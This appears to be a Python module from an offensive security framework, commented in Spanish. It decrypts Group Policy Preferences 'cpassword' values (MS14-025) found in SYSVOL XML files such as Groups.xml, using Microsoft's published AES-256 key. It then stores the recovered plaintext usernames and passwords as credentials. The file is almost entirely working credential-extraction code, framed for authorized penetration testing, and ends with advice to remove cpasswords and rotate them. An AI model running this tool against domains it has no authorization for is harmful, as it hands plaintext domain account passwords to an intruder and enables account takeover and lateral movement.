# -*- coding: utf-8 -*-
"""
Módulo ad/gpp_cpassword
=======================
Descifra las contraseñas "cpassword" de Group Policy Preferences (MS-GPPREF,
CVE-2014-1812 / MS14-025) contenidas en los XML de SYSVOL:

    • Groups.xml · ScheduledTasks.xml · Services.xml
    • DataSources.xml · Drives.xml · Printers.xml

La "cpassword" se cifra con AES-256-CBC usando una CLAVE PRIVADA PUBLICADA
por Microsoft en MS-GPPREF (IV a ceros, texto plano UTF-16LE), por lo que
cualquier usuario autenticado del dominio puede leerla desde
\\\\DOMINIO\\SYSVOL. Parcheado desde 2014, pero sigue siendo habitual en
entornos heredados — el archivo queda en disco aunque borres la GPO.

Implementación 100% pura: parser XML de stdlib + AES propio (core/aes_min).

Riesgo: MEDIO (solo lee un fichero que el operador ya tiene autorizado).
ATT&CK: T1552.006 (Unsecured Credentials: Group Policy Preferences).
"""

import base64
import re
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import Dict, List

from core.aes_min import descifrar_cbc
from core.base_module import BaseModulo, ModuloError

# Clave AES-256 "privada" publicada por Microsoft en MS-GPPREF (hex)
CLAVE_GPP = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")
IV_GPP = bytes(16)

_FICHEROS_GPP = ("Groups.xml", "ScheduledTasks.xml", "Services.xml",
                 "DataSources.xml", "Drives.xml", "Printers.xml")


def descifrar_cpassword(cpassword: str) -> str:
    """Descifra un valor cpassword (función pura, testeable sin red)."""
    texto = (cpassword or "").strip()
    # Base64 sin relleno: los XML de GPP suelen omitir el '=' final
    relleno = "=" * (-len(texto) % 4)
    cifrado = base64.b64decode(texto + relleno)
    if not cifrado or len(cifrado) % 16:
        raise ValueError("cpassword no es un bloque AES válido")
    plano = descifrar_cbc(cifrado, CLAVE_GPP, IV_GPP)
    return plano.decode("utf-16-le", errors="replace")


def extraer_cpasswords(xml_texto: str) -> List[Dict]:
    """Extrae todos los atributos tipo password de un XML de GPP (pura).

    Devuelve [{elemento, usuario, descripcion, cpassword}] — la contraseña
    NO se descifra aquí para mantener la función libre de criptografía.
    """
    hallazgos: List[Dict] = []
    try:
        raiz = ET.fromstring(xml_texto)
    except ET.ParseError as err:
        raise ValueError(f"XML no válido: {err}")
    for elemento in raiz.iter():
        atributos = elemento.attrib
        for nombre_at, valor in atributos.items():
            if not re.fullmatch(r"cpassword", nombre_at, re.IGNORECASE):
                continue
            usuario = (atributos.get("userName")
                       or atributos.get("runAs")
                       or atributos.get("accountName")
                       or atributos.get("account")
                       or "")
            hallazgos.append({
                "elemento": elemento.tag,
                "usuario": usuario,
                "descripcion": atributos.get("desc", "") or atributos.get("newName", ""),
                "cpassword": valor,
            })
    return hallazgos


class GppCpassword(BaseModulo):
    """Descifra contraseñas de Group Policy Preferences (MS14-025)."""

    NAME = "ad/gpp_cpassword"
    CATEGORIA = "ad"
    DESCRIPCION = ("Descifra cpassword de GPP (Groups.xml y 5 XML más de SYSVOL) "
                   "con AES-256 puro — MS14-025/CVE-2014-1812")
    RIESGO = "medio"
    AUTOR = "REDHAVOC"
    REFERENCIA = "MS-GPPREF · MS14-025 · BloodHound/GPPObj"
    CVE = ("MS14-025", "CVE-2014-1812")
    ATTCK = ("T1552.006",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("RUTA", "", True,
                               "Ruta del XML (Groups.xml) exportado de SYSVOL")
        self.opciones.declarar("RECURSIVO", "false", False,
                               "Si RUTA es una carpeta, buscar todos los XML de GPP")

    # ------------------------------------------------------------------
    def ejecutar(self) -> dict:
        ruta = Path(self.opt("RUTA").strip().strip('"')).expanduser()
        if not ruta.exists():
            raise ModuloError(
                f"No existe la ruta: {ruta}. Copia el XML de SYSVOL "
                "(\\\\DOMINIO\\SYSVOL\\DOMINIO\\Policies\\{GUID}\\Machine\\Preferences\\…)")
        if ruta.is_dir() and self.opt_bool("RECURSIVO"):
            ficheros = sorted(p for p in ruta.rglob("*.xml")
                              if p.name in _FICHEROS_GPP)
            if not ficheros:
                raise ModuloError("En la carpeta no hay XML de GPP conocidos "
                                  "(Groups.xml, ScheduledTasks.xml, …)")
        elif ruta.is_dir():
            ficheros = [p for p in sorted(ruta.glob("*.xml"))
                        if p.name in _FICHEROS_GPP] or sorted(ruta.glob("*.xml"))
            if not ficheros:
                raise ModuloError("La carpeta no contiene XML.")
        else:
            ficheros = [ruta]

        descifradas, errores, ficheros_ok = [], [], 0
        for fichero in ficheros:
            try:
                xml_texto = fichero.read_text(encoding="utf-8", errors="replace")
                entradas = extraer_cpasswords(xml_texto)
            except (OSError, ValueError) as err:
                errores.append(f"{fichero.name}: {err}")
                continue
            if entradas:
                ficheros_ok += 1
            for entrada in entradas:
                try:
                    secreto = descifrar_cpassword(entrada["cpassword"])
                except Exception:  # noqa: BLE001 — un valor corrupto no tumba el run
                    secreto = ""
                    errores.append(f"{fichero.name}: cpassword no descifrable")
                descifradas.append({
                    "fichero": fichero.name,
                    "elemento": entrada["elemento"],
                    "usuario": entrada["usuario"],
                    "descripcion": entrada["descripcion"],
                    "contrasena": secreto,
                })

        if not descifradas and not errores:
            raise ModuloError(
                "El XML no contiene atributos cpassword (buena noticia: la GPO "
                "no guarda contraseñas o ya está remediada).")

        # Workspace: contraseñas en claro + credenciales + hallazgo
        host = self.opt("RUTA")
        for d in descifradas:
            if not d["contrasena"]:
                continue
            if self.workspace is not None:
                self.workspace.add_vuln(
                    host, "Contraseña de GPP descifrable (MS14-025)", "alto",
                    f"{d['fichero']} · {d['elemento']} · usuario={d['usuario'] or '?'}",
                    self.NAME)
                if d["usuario"]:
                    self.workspace.add_cred(host, d["usuario"], d["contrasena"],
                                            "gpp")

        return {
            "resumen": (f"{len(descifradas)} cpassword encontradas · "
                        f"{sum(1 for d in descifradas if d['contrasena'])} descifradas "
                        f"· {ficheros_ok} XML con hallazgos"),
            "ficheros_analizados": [f.name for f in ficheros],
            "cpasswords": descifradas,
            "errores": errores,
            "clave_ms": CLAVE_GPP.hex(),
            "nota": ("MS14-025: la clave 'privada' de MS-GPPREF es pública desde 2014. "
                     "Elimina cpassword de las GPO y rota esas credenciales."),
        }
